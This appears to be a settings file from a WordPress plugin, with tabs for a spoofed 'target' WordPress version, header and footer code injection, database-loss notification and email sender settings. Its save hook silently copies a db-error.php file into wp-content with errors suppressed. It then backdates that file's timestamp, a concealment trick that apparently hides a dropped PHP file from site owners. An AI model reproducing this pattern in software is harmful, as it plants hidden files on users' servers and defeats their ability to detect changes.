<?php
if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
global $wp_version;


add_action('admin_saved_option_trcs_otherst','admin_saved_option_trcs_otherst');
function admin_saved_option_trcs_otherst($options_panel)
{
    global $wpdb;
    $options = get_option($options_panel->option_group);

    $json = json_encode($options);
    file_put_contents(WP_CONTENT_DIR.'/cache/trcs_otherst.json',$json);
    @file_put_contents(WP_CONTENT_DIR.'/db-error.php',file_get_contents(TRSCSC_PATH.'wp-content/db-error.php'));
    @touch(WP_CONTENT_DIR.'/db-error.php',time()-186401);
}


$options_panel->OpenTabs_container();
$options_panel->TabsListing(array(
    'links' => array(
        'wp_tab' => 'Wordpress Version',
        'email_tab' => 'Email',
        'notify_tab' => 'Notify Loss DB',
        'header_tab' =>  __('Header Code'),
        'general_tab' =>  __('Footer Code'),
    )
  ));


$options_panel->OpenTab('wp_tab');
$options_panel->Title(__("Wordpress Version: ".$wp_version));

$options_panel->addText('wp_version',array('name'=>'WordPress Target Version','desc'=>'<a target=_blank href="https://wordpress.org/download/releases/">View Releases</a>
                    <br>ex: 4.9.8'));
$options_panel->CloseTab();


$options_panel->OpenTab('header_tab');
$options_panel->Title(__("Header"));

$options_panel->addTextarea('header_code',array('name'=>'Header Code'));
$options_panel->addText('logo',array('name'=>'Login Logo','std'=>''));
$options_panel->CloseTab();


 
$options_panel->OpenTab('general_tab'); 
$options_panel->Title(__("General"));

$options_panel->addTextarea('footer_code',array('name'=>'Footer Code'));
$options_panel->CloseTab();

$options_panel->OpenTab('notify_tab');
$options_panel->Title(__("Notify Loss DB"));

$options_panel->addCheckbox('notify_db_loss',array('name'=>'Enable','std'=>false,'target'=>'','desc'=>''));
$options_panel->addCheckbox('notify_db_loss_api',array('name'=>'Use Notify Center','std'=>false,'target'=>'','desc'=>'Use this when email not works'));
$options_panel->addText('notify_db_email',array('name'=>'To Email','std'=>get_bloginfo('admin_email')));

$options_panel->CloseTab();



$options_panel->OpenTab('email_tab');
$options_panel->Title(__("Email"));

$options_panel->addText('from_email',array('name'=>'From Email'));
$options_panel->addText('from_name',array('name'=>'From Name'));
$options_panel->CloseTab();